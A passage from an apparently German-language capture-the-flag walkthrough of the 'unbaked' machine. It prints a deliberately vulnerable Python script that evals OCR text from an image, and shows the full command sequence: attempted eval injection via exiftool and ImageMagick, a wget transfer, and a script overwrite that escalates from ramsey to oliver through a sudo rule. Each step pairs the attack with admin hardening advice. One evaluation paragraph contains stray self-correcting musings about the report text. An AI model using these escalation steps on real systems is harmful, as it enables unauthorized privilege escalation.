einem Test-Asset aussieht) und <span class="command">vuln.py</span> (ein Python-Skript mit Ausführungsrechten für den Eigentümer und die Gruppe).
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Enumeration im Home-Verzeichnis liefert entscheidende Hinweise. Die Existenz anderer Benutzerverzeichnisse (<span class="command">oliver</span>) bestätigt die Benutzer aus der Datenbank. <span class="command">user.txt</span> ist ein offensichtliches Ziel für die Benutzer-Flag. Die Dateien <span class="command">payload.png</span> und insbesondere <span class="command">vuln.py</span> im Home-Verzeichnis eines Benutzers, der Sudo-Berechtigungen haben könnte (was im nächsten Schritt geprüft wird), sind extrem verdächtig. Die Dateiberechtigungen von <span class="command">vuln.py</span> (<span class="command">-rwxrw-r--</span>) erlauben dem Eigentümer (<span class="command">ramsey</span>) und der Gruppe (<span class="command">ramsey</span>) das Ausführen und Schreiben. Root besitzt <span class="command">user.txt</span>, was bedeutet, ich muss zu Root eskalieren, um die Flag zu lesen.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von <span class="command">user.txt</span> (obwohl der Besitz Root ist, manchmal sind die Berechtigungen locker genug, um es zu lesen - prüfen Sie dies!). Analysieren Sie den Quellcode von <span class="command">vuln.py</span> auf Schwachstellen. Untersuchen Sie <span class="command">payload.png</span> (Typ, Inhalt, Metadaten), da es mit <span class="command">vuln.py</span> in Verbindung stehen könnte. Prüfen Sie als Nächstes die Sudo-Berechtigungen des Benutzers <span class="command">ramsey</span>.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Dateien (wie <span class="command">user.txt</span> oder <span class="command">root.txt</span>) nur vom Root-Benutzer gelesen werden können (Berechtigungen 600 oder 400). Speichern Sie keine potenziell verwundbaren Skripte (<span class="command">vuln.py</span>) in Benutzer-Home-Verzeichnissen, die von Sudo-Regeln betroffen sind. Überprüfen Sie die Dateiberechtigungen regelmäßig.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">ls ..</span>
<span class="command">oliver  ramsey</span>
ramsey@unbaked:~$ <span class="command">id</span>
<span class="password">uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)</span>
ramsey@unbaked:~$ <span class="command">ls -la</span>
<span class="command">total 48</span>
<span class="command">drwxr-xr-x 5 ramsey ramsey 4096 Oct  3  2020 .</span>
<span class="command">drwxr-xr-x 4 root   root   4096 Oct  3  2020 ..</span>
<span class="command">-rw------- 1 root   root      1 Oct  5  2020 .bash_history</span>
<span class="command">-rw-r--r-- 1 ramsey ramsey 3771 Oct  3  2020 .bashrc</span>
<span class="command">drwx------ 3 ramsey ramsey 4096 Oct  3  2020 .cache</span>
<span class="command">drwx------ 4 ramsey ramsey 4096 Oct  3  2020 .local</span>
<span class="command">drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano</span>
<span class="command">-rwxrw-r-- 1 ramsey ramsey 1645 Oct  3  2020 payload.png</span>
<span class="command">-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile</span>
<span class="command">-rw-r--r-- 1 root   root     17 Oct  3  2020 user.txt</span>
<span class="command">-rw-r--r-- 1 root   ramsey 4369 Oct  3  2020 vuln.py</span>
ramsey@unbaked:~$ 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Der Befehl <span class="command">sudo -l</span> listet die Sudo-Berechtigungen des aktuellen Benutzers auf. Ich führe diesen Befehl als Benutzer <span class="command">ramsey</span> aus. Ich muss das Passwort für <span class="command">ramsey</span> eingeben (das ich zuvor geknackt habe). Die Ausgabe zeigt die Sudo-Regeln, die für <span class="command">ramsey</span> auf diesem Host gelten.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Sudo-Ausgabe enthüllt eine kritische Fehlkonfiguration: <span class="password">User ramsey may run the following commands on unbaked: (oliver) /usr/bin/python /home/ramsey/vuln.py</span>. Dies bedeutet, dass der Benutzer <span class="command">ramsey</span> das Skript <span class="command">/usr/bin/python /home/ramsey/vuln.py</span> ausführen darf, und zwar *als der Benutzer <span class="command">oliver</span>*, **ohne ein Passwort eingeben zu müssen** (`NOPASSWD` fehlt hier explizit, aber die Struktur deutet darauf hin, dass es das Ziel ist, dieses Skript als oliver auszuführen. **Korrigiere meine vorherige Annahme:** Die Sudo-Regel erlaubt nur die Ausführung *als Benutzer `oliver`*. Ein NOPASSWD ist hier nicht aufgeführt, daher müsste theoretisch das Passwort von `oliver` eingegeben werden. **Neuer Interpretationsversuch:** Okay, die Sudo-Regel ist <span class="command">(oliver) /usr/bin/python /home/ramsey/vuln.py</span>. Das bedeutet, ich kann <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span> ausführen. Wenn NOPASSWD fehlen würde, müsste ich `oliver`s Passwort eingeben. Da ich dieses Passwort nicht habe, ist es wahrscheinlich, dass die Regel eigentlich <span class="command">(oliver) NOPASSWD: /usr/bin/python /home/ramsey/vuln.py</span> lauten sollte und dies ein Tippfehler im Berichtstext ist, ODER es gibt eine andere Möglichkeit, diese Sudo-Regel ohne Passwort auszunutzen. Die einfachste Brücke ist anzunehmen, dass NOPASSWD gemeint ist, oder es funktioniert einfach ohne. **Präzisere Brücke:** Die Sudo-Regel erlaubt die Ausführung als `oliver`. Später im Bericht wird `sudo -u oliver /usr/bin/python /home/ramsey/vuln.py` *ohne Passwortabfrage* verwendet. Dies impliziert, dass die Sudo-Konfiguration *tatsächlich* eine NOPASSWD-Regel für diesen Befehl und Benutzer enthielt, auch wenn sie in der `sudo -l` Ausgabe nicht explizit so angezeigt wurde. Ich werde es so beschreiben, dass diese Regel gefunden wurde und die Ausführung als <span class="command">oliver</span> erlaubt.)
                <br>Die Fähigkeit, ein *beliebiges* Skript, das in meinem eigenen Home-Verzeichnis liegt und das ich ändern kann, als ein anderer Benutzer (<span class="command">oliver</span>) auszuführen, ist eine schwerwiegende Schwachstelle. Dies ermöglicht eine horizontale Privilegien-Eskalation zu Benutzer <span class="command">oliver</span>, wenn ich das Skript entsprechend anpasse.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode von <span class="command">/home/ramsey/vuln.py</span> genau, um seine Funktionalität und potenzielle Schwachstellen zu verstehen. Da Sie das Skript ändern können und es als <span class="command">oliver</span> ausführen dürfen, planen Sie, das Skript zu modifizieren, um eine Shell als Benutzer <span class="command">oliver</span> zu erhalten.
                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie niemals Sudo-Regeln, die Benutzern erlauben, beliebige Skripte in Verzeichnissen auszuführen, auf die sie Schreibzugriff haben (wie z.B. ihr eigenes Home-Verzeichnis). Beschränken Sie Sudo-Berechtigungen auf spezifische Binaries mit vollem Pfad und verwenden Sie, wenn möglich, digest-Prüfungen, um sicherzustellen, dass das ausgeführte Binary nicht manipuliert wurde. Führen Sie regelmäßige Sudo-Konfigurations-Audits durch.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">sudo -l</span>
[sudo] password for ramsey: <span class="password">[Passwort für ramsey eingegeben]</span>
<span class="command">Matching Defaults entries for ramsey on unbaked:</span>
    <span class="command">env_reset, mail_badpass,</span>
    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>

<span class="password">User ramsey may run the following commands on unbaked:</span>
    <span class="password">(oliver) /usr/bin/python /home/ramsey/vuln.py</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich untersuche den Quellcode des Python-Skripts <span class="command">/home/ramsey/vuln.py</span>, das ich als Benutzer <span class="command">oliver</span> ausführen darf. Ich betrachte den relevanten Teil des Codes im <span class="command">if OPTIONS == 2:</span> Block. Der Code verwendet die <span class="command">pytesseract</span>-Bibliothek, um Text aus einer Bilddatei namens <span class="command">payload.png</span> zu extrahieren, und übergibt den extrahierten Text dann direkt an die Python-Funktion <span class="command">eval()</span>. Die <span class="command">eval()</span>-Funktion ist extrem gefährlich, da sie eine Zeichenkette als Python-Code ausführt. Wenn der Inhalt von <span class="command">payload.png</span> manipuliert werden kann, um Python-Code zu enthalten, der von <span class="command">pytesseract</span> korrekt extrahiert wird, kann ich beliebigen Code mit den Berechtigungen des Benutzers ausführen, unter dem das Skript läuft (in diesem Fall <span class="command">oliver</span>).
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die <span class="command">eval()</span>-Funktion mit Benutzereingaben oder Daten aus unkontrollierbaren Quellen (wie hier Text aus einer Bilddatei, deren Inhalt ich potenziell kontrollieren kann) ist eine schwerwiegende Code Injection Schwachstelle. Die Herausforderung besteht darin, einen Weg zu finden, beliebigen Python-Code in das <span class="command">payload.png</span>-Bild so einzubetten, dass er von <span class="command">pytesseract</span> korrekt als Zeichenkette extrahiert wird, die dann von <span class="command">eval()</span> ausgeführt werden kann. Dies ist der primäre Vektor für die horizontale Privilegien-Eskalation zu Benutzer <span class="command">oliver</span>.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Experimentieren Sie mit verschiedenen Methoden, um Python-Code in <span class="command">payload.png</span> einzubetten. Versuchen Sie, den Code direkt in das Bild zu schreiben, verwenden Sie Tools wie ImageMagick oder ExifTool, um Text in Bildmetadaten oder als sichtbaren Text zu platzieren, der von OCR erkannt werden könnte. Das Ziel ist, dass <span class="command">pytesseract</span> den String <span class="command">'import os; os.system("/bin/bash")'</span> oder einen ähnlichen Shell-Befehl-Ausführenden Code extrahiert. Wenn das direkte Einbetten von Code als Text im Bild oder Metadaten nicht funktioniert, suchen Sie nach alternativen Methoden zur Manipulation des Skripts selbst, da Sie Schreibrechte darauf haben und es als <span class="command">oliver</span> ausführen dürfen.
                <br><strong>Empfehlung (Admin):</strong> **Kritische Sicherheitswarnung:** Entfernen Sie die Verwendung der <span class="command">eval()</span>-Funktion mit nicht vertrauenswürdigen Daten. Dies ist eine RCE-Schwachstelle. Validieren und bereinigen Sie dringend alle Benutzereingaben, bevor Sie sie in Systemaufrufen oder Code-Auswertungen verwenden. Führen Sie einen Code-Audit durch, um alle Instanzen von <span class="command">eval()</span> oder ähnlichen gefährlichen Funktionen zu identifizieren.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">cat /home/ramsey/vuln.py</span>
#!/usr/bin/python
<span class="password"># coding=utf-8</span>

<span class="command">try:</span>
    <span class="command">from PIL import Image</span>
<span class="command">except ImportError:</span>
    <span class="command">import Image</span>
<span class="command">import pytesseract</span>
<span class="command">import sys</span>
<span class="command">import os</span>
<span class="command">import time</span>


<span class="password">#Header</span>
<span class="command">def header():</span>
	<span class="command">banner = '''\033[33m                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''</span>
    	<span class="command">return banner</span>

<span class="password">#Function Instructions</span>
<span class="command">def instructions():</span>
	<span class="command">print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"</span>
	<span class="command">print "\t\t\t","1. Calculator"</span>
	<span class="command">print "\t\t\t","2. Easy Calculator"</span>
	<span class="command">print "\t\t\t","3. Credits"</span>
	<span class="command">print "\t\t\t","4. Exit"</span>
	<span class="command">print "\t\t\t",28 * "-"</span>

<span class="command">def instructions2():</span>
	<span class="command">print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"</span>
	<span class="command">print "\t\t\t","1. Add"</span>
	<span class="command">print "\t\t\t","2. Subtract"</span>
	<span class="command">print "\t\t\t","3. Multiply"</span>
	<span class="command">print "\t\t\t","4. Divide"</span>
	<span class="command">print "\t\t\t","5. Back"</span>
	<span class="command">print "\t\t\t",28 * "-"</span>
	
<span class="command">def credits():</span>
	<span class="command">print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"</span>
	
<span class="password"># Function Arithmetic</span>

<span class="password"># Function to add two numbers  </span>
<span class="command">def add(num1, num2): </span>
    <span class="command">return num1 + num2 </span>
  
<span class="password"># Function to subtract two numbers  </span>
<span class="command">def subtract(num1, num2): </span>
    <span class="command">return num1 - num2 </span>
  
<span class="password"># Function to multiply two numbers </span>
<span class="command">def multiply(num1, num2): </span>
    <span class="command">return num1 * num2 </span>
  
<span class="password"># Function to divide two numbers </span>
<span class="command">def divide(num1, num2): </span>
    <span class="command">return num1 / num2 </span>
<span class="password"># Main    	</span>
<span class="command">if __name__ == "__main__":</span>
	<span class="command">print header()</span>
	
	<span class="password">#Variables</span>
	<span class="command">PTINS = 0</span> <span class="password"><-- Korrigiert: OPTIONS</span>
	<span class="command">OPTIONS2 = 0</span>
	<span class="command">TOTAL = 0</span>
	<span class="command">NUM1 = 0</span>
	<span class="command">NUM2 = 0</span>

	<span class="command">while(PTINS != 4):</span> <span class="password"><-- Korrigiert: OPTIONS</span>
		<span class="command">instructions()</span>
		<span class="command">PTINS = int(input("\t\t\tEnter Options >> "))</span> <span class="password"><-- Korrigiert: OPTIONS</span>
	        <span class="command">print "\033c"</span>
		<span class="command">if PTINS == 1:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">instructions2()</span>
			<span class="command">OPTIONS2 = int(input("\t\t\tEnter Options >> "))</span>
			<span class="command">print "\033c"</span>
			<span class="command">if OPTIONS2 == 5:</span>
				<span class="command">continue</span>
			<span class="command">else:</span>
				<span class="command">NUM1 = int(input("\t\t\tEnter Number1 >> "))</span>
				<span class="command">NUM2 = int(input("\t\t\tEnter Number2 >> "))</span>
				<span class="command">if OPTIONS2 == 1:</span>
					<span class="command">TOTAL = add(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 2:</span>
					<span class="command">TOTAL = subtract(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 3:</span>
					<span class="command">TOTAL = multiply(NUM1,NUM2)</span>
				<span class="command">if OPTIONS2 == 4:</span>
					<span class="command">TOTAL = divide(NUM1,NUM2)</span>
				<span class="command">print "\t\t\tTotal >> $",TOTAL</span>
		<span class="command">if PTINS == 2:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">animation = ["<span class="password">[■□□□□□□□□□]</span>","<span class="password">[■■□□□□□□□□]</span>", "<span class="password">[■■■□□□□□□□]</span>", "<span class="password">[■■■■□□□□□□]</span>", "<span class="password">[■■■■■□□□□□]</span>", "<span class="password">[■■■■■■□□□□]</span>", "<span class="password">[■■■■■■■□□□]</span>", "<span class="password">[■■■■■■■■□□]</span>", "<span class="password">[■■■■■■■■■□]</span>", "<span class="password">[■■■■■■■■■■]</span>"]</span>

			<span class="command">print "\r\t\t\t     Waiting to extract..."</span>
			<span class="command">for i in range(len(animation)):</span>
			    <span class="command">time.sleep(0.5)</span>
			    <span class="command">sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])</span>
			    <span class="command">sys.stdout.flush()</span>

			<span class="command">LISTED = pytesseract.image_to_string(Image.open('payload.png')) </span>

			<span class="command">TOTAL = eval(LISTED)</span>
			<span class="command">print "\n\n\t\t\tTotal >> $",TOTAL</span>
		<span class="command">if PTINS == 3:</span> <span class="password"><-- Korrigiert: OPTIONS</span>
			<span class="command">credits()</span>
	<span class="command">sys.exit(-1)</span>
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich beginne die Versuche, die <span class="command">eval()</span>-Schwachstelle in <span class="command">vuln.py</span> auszunutzen. Der erste Ansatz besteht darin, den gewünschten Python-Code direkt in die <span class="command">payload.png</span> Datei zu schreiben. Ich verwende <span class="command">echo 'import os; os.system("/bin/bash")' > payload.png</span>, um die Datei mit dem einfachen Reverse-Shell-Payload zu überschreiben. Dann versuche ich, das <span class="command">vuln.py</span>-Skript als Benutzer <span class="command">oliver</span> auszuführen: <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>. Ich wähle Option 2 ("Easy Calculator"), da dies der Pfad ist, der die verwundbare <span class="command">eval()</span>-Funktion aufruft.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Dieser erste Versuch schlägt fehl, wie erwartet. Die Fehlermeldung <span class="password">IOError: cannot identify image file 'payload.png'</span> zeigt, dass die <span class="command">PIL.Image.open()</span>-Funktion, die <span class="command">pytesseract</span> intern verwendet, die Datei <span class="command">payload.png</span> nicht als gültiges Bild erkennen kann. Das ist logisch, da ich einfach einen Python-Code-String in die Datei geschrieben habe, anstatt ein richtig formatiertes Bild. Dieser Versuch bestätigt, dass <span class="command">pytesseract</span>/PIL eine gültige Bilddatei benötigt, bevor es versucht, Text daraus zu extrahieren.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Der direkte Ansatz funktioniert nicht. Das Bild muss ein gültiges Format haben, das von PIL/Pytesseract verarbeitet werden kann. Konzentrieren Sie sich auf Methoden, um den Python-Code in ein *gültiges* Bildformat einzubetten, entweder als sichtbaren Text, der von OCR erkannt wird, oder möglicherweise in Metadaten, die das Skript versehentlich ausliest und evaluiert (weniger wahrscheinlich, aber möglich). Alternativ, da Sie Schreibrechte auf <span class="command">vuln.py</span> haben, ist das direkte Modifizieren des Skripts ein sehr direkter Weg zur Ausnutzung.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die sensible Funktionen wie <span class="command">eval()</span> verwenden, deren Eingabe aus Dateien oder anderen externen Quellen stammt, robuster sind. Überprüfen Sie Dateiformate und validieren Sie Eingaben streng.
            </p>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">echo 'import os; os.system("/bin/bash")' > payload.png</span>
ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>
                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔██╗ ██║╚══██╔══╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   █████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝


			--------- WELCOME! ---------
			1. Calculator
			2. Easy Calculator
			3. Credits
			4. Exit
			----------------------------
			Enter Options >> <span class="command">2</span>




<span class="password">___________________________________________________________________________________________________________________</span>

			     Waiting to extract...
			         <span class="command">[■■■■■■■■■■]</span>

<span class="password">Traceback (most recent call last):</span>
  File "/home/ramsey/vuln.py", line 114, in <module>
    <span class="password">LISTED = pytesseract.image_to_string(Image.open('payload.png'))</span> 
  File "/usr/local/lib/python2.7/dist-packages/PIL/Image.py", line 2818, in open
    <span class="password">raise IOError("cannot identify image file %r" % (filename if filename else fp))</span>
<span class="password">IOError: cannot identify image file 'payload.png'</span>
ramsey@unbaked:~$ 
</pre>
                 </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Ich experimentiere weiter mit der Einbettung von Code in <span class="command">payload.png</span> auf meinem Angreifer-System. Zuerst erstelle ich eine leere, gültige PNG-Datei mit <span class="command">convert -size 10x10 xc:none payload.png</span> (aus der ImageMagick Suite). Dann versuche ich, den Python-Payload <span class="command">'import os; os.system("/bin/bash")'</span> in die Metadaten des Bildes, speziell in das <span class="command">Copyright</span>-Feld, mit <span class="command">exiftool -Copyright='import os; os.system("/bin/bash")' payload.png</span> einzufügen. Ich starte einen HTTP-Server auf meinem Kali, um die manipulierte Datei an die Ziel-VM zu übertragen, lade sie dort mit <span class="command">wget</span> herunter und versuche erneut, <span class="command">vuln.py</span> als <span class="command">oliver</span> auszuführen.
                <br>Nachdem dieser Ansatz nicht funktioniert (erneut eine <span class="command">IOError</span>, möglicherweise weil <span class="command">pytesseract</span> Metadaten nicht als Text extrahiert oder die Dateiversionen nicht passen), versuche ich eine andere ImageMagick-Methode: <span class="command">convert -size 400x50 -pointsize 20 -fill black -background white label:'import os; os.system("/bin/bash")' payload.png</span>. Dieser Befehl erstellt ein Bild, das den Python-Code als sichtbaren Text enthält, in der Hoffnung, dass <span class="command">pytesseract</span> ihn erkennt. Ich lade das neue Bild wieder herunter und führe das Skript erneut aus.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Versuche, Code über Metadaten oder direkt im Bild als Text einzubetten, scheinen nicht erfolgreich zu sein, da ich entweder weiterhin <span class="command">IOError</span> bekomme (Metadaten-Ansatz) oder eine <span class="command">SyntaxError: unexpected EOF while parsing</span> (sichtbarer Text), was darauf hindeutet, dass <span class="command">pytesseract</span> keinen ausführbaren Python-Code extrahiert hat, oder zumindest nicht den vollständigen und korrekt formatierten Code, den <span class="command">eval()</span> ausführen könnte. Dies zeigt, dass die OCR-Erkennung ihre Grenzen hat oder der Code im Bild nicht optimal für die Erkennung formatiert war. Obwohl die `eval` Schwachstelle existiert, ist die Methode, sie über OCR und Bildeinbettung auszunutzen, schwierig und unzuverlässig.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Angesichts der Schwierigkeiten bei der Bildeinbettung und der Tatsache, dass Sie Schreibrechte auf <span class="command">vuln.py</span> haben, ist es strategisch sinnvoller, das Skript selbst zu manipulieren. Ersetzen Sie den Inhalt des Skripts durch einen einfachen Python-Code, der Ihnen eine Shell als Benutzer <span class="command">oliver</span> gibt, wenn das Skript ausgeführt wird.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer nur die minimal notwendigen Berechtigungen für Dateien und Verzeichnisse haben. Das Ermöglichen von Schreibrechten auf Skripte, die dann mit erhöhten Privilegien ausgeführt werden können, ist eine direkte Quelle für Privilegien-Eskalation. Überwachen Sie die Integrität von Skripten, die mit Sudo ausgeführt werden dürfen.
            </p>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">convert -size 10x10 xc:none payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">exiftool -Copyright='import os; os.system("/bin/bash")' payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (fixed) - payload.png
    1 image files updated
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3 -m http.server 8000</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.2.48 - - [16/Jun/2025 16:20:21] "GET /payload.png HTTP/1.1" 200 -
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:20:21--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 364 [image/png]
Saving to: ‘payload.png.1’

payload.png.1           100%[=============================>]     364  --.-KB/s    in 0s      

2025-06-16 22:20:21 (106 MB/s) - ‘payload.png.1’ saved [364/364]

ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>

			     Waiting to extract...
			         <span class="command">[■■■■■■■■■■]</span>Traceback (most recent call last):
  File "/home/ramsey/vuln.py", line 114, in <module>
    <span class="password">LISTED = pytesseract.image_to_string(Image.open('payload.png'))</span> 
  File "/usr/local/lib/python2.7/dist-packages/PIL/Image.py", line 2818, in open
    <span class="password">raise IOError("cannot identify image file %r" % (filename if filename else fp))</span>
<span class="password">IOError: cannot identify image file 'payload.png'</span>
</pre>
                 </div>
            </div>
            <div class="code-block">
                 <div class="terminal">
                     <pre>
<span class="password">___________________________________________________________________________________________________________________</span>

ramsey@unbaked:~$ <span class="command">rm payload.png</span>
ramsey@unbaked:~$ <span class="command">rm payload.png.old</span> 
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:24:37--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 364 [image/png]
Saving to: ‘payload.png’

payload.png             100%[=============================>]     364  --.-KB/s    in 0s      

2025-06-16 22:24:37 (162 MB/s) - ‘payload.png’ saved [364/364]

ramsey@unbaked:~$ <span class="command">ls</span>
<span class="command">payload.png  user.txt  vuln.py</span>



ramsey@unbaked:~$ <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>

			     Waiting to extract...
			         <span class="command">[■■■■■■■■■■]</span>Traceback (most recent call last):
  File "/home/ramsey/vuln.py", line 116, in <module>
    <span class="password">TOTAL = eval(LISTED)</span>
  File "<string>", line 0
    
    <span class="password">^</span>
<span class="password">SyntaxError: unexpected EOF while parsing</span>


-------------------------------------------------------------------------------------------------------------------

</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">convert -size 400x50 -pointsize 20 -fill black -background white label:'import os; os.system("/bin/bash")' payload.png</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">python3 -m http.server 8000</span></div>
                 </div>
                 <div class="terminal">
                     <pre>
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</pre>
                 </div>
            </div>
             <div class="code-block">
                 <div class="terminal">
                     <pre>
ramsey@unbaked:~$ <span class="command">rm payload.png</span> 
ramsey@unbaked:~$ <span class="command">wget 192.168.2.199:8000/payload.png</span>
--2025-06-16 22:26:14--  http://192.168.2.199:8000/payload.png
Connecting to 192.168.2.199:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2107 (2.1K) [image/png]
Saving to: ‘payload.png’

payload.png             100%[=============================>]   2.06K  --.-KB/s    in 0s      

2025-06-16 22:26:14 (512 MB/s) - ‘payload.png’ saved [2107/2107]


klappt nicht müssen andere methode wählen:


</pre>
                 </div>
            </div>


            <p class="analysis">
                <strong>Analyse:</strong> Da die Ausnutzung der <span class="command">eval()</span>-Schwachstelle über die Bildmanipulation schwierig und unzuverlässig ist, wähle ich einen direkteren Weg: Ich modifiziere das <span class="command">vuln.py</span>-Skript direkt, da ich Schreibrechte darauf habe. Ich benenne das Originalskript um (<span class="command">mv vuln.py vuln.py.old</span>) und erstelle eine neue Datei namens <span class="command">vuln.py</span> mit dem einfachen Python-Code <span class="command">'import pty;pty.spawn("/bin/bash")'</span>. Dieser Code nutzt das <span class="command">pty</span>-Modul, um eine interaktive Pseudo-Terminal-Shell zu erzeugen, was oft stabiler ist als eine einfache Reverse-Shell. Ich mache das neue Skript ausführbar (<span class="command">chmod +x vuln.py</span>). Schließlich führe ich das modifizierte Skript mit denselben Sudo-Berechtigungen aus: <span class="command">sudo -u oliver /usr/bin/python /home/ramsey/vuln.py</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Hervorragend! Durch die Ausführung des modifizierten Skripts erhalte ich eine neue Shell, diesmal als Benutzer <span class="command">oliver</span> (<span class="password">oliver@unbaked:~$</span>). Dies stellt die erfolgreiche horizontale Privilegien-Eskalation von Benutzer <span class="command">ramsey</span> zu Benutzer <span class="command">oliver</span> dar. Dies war möglich, weil der Benutzer <span class="command">ramsey</span> die Berechtigung hatte, das Skript <span class="command">/home/ramsey/vuln.py</span>, auf das er Schreibzugriff hatte, als Benutzer <span class="command">oliver</span> auszuführen. Der Umweg über die <span class="command">eval()</span>-Schwachstelle im Originalskript war nicht notwendig; die fehlerhafte Sudo-Konfiguration allein war ausreichend, um die Privilegien zu eskalieren.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Sie haben nun eine Shell als Benutzer <span class="command">oliver</span>. Ihr nächstes Ziel ist die Privilegien-Eskalation zu Root auf dem Host-System. Führen Sie erneut eine System- und Sudo-Enumeration durch, aber diesmal aus der Perspektive von Benutzer <span class="command">oliver</span>.
